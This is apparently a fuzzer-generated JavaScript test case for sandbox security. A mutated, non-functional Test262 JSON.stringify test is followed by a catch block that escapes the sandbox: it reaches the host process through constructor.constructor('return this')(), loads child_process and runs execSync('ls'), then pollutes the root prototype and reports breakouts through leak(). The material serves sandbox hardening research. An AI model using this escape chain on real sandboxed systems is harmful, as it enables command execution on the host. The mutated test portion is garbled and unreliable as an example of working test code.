try {
    Object.defineProperty(Object.prototype, '', {
        set: function () {
            let REPLACER = 23;
            throw new Test262Error('[[Set]] should not be called.');
        }
    });
    var value = {};
    var wrapper;
    JSON.stringify(value, function () {
        throw () => {
            return () => {
            };
        };
        wrapper = this;
    });
    assert.sameValue(typeof wrapper, 'object');
    assert.sameValue(Object.getPrototypeOf(wrapper), Object.prototype);
    assert.sameValue(Object.getOwnPropertyNames(wrapper).length, 1);
    assert(Object.isExtensible(wrapper));
    verifyProperty(wrapper, '', {
        value: value,
        writable: true,
        enumerable: true,
        configurable: true
    });
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}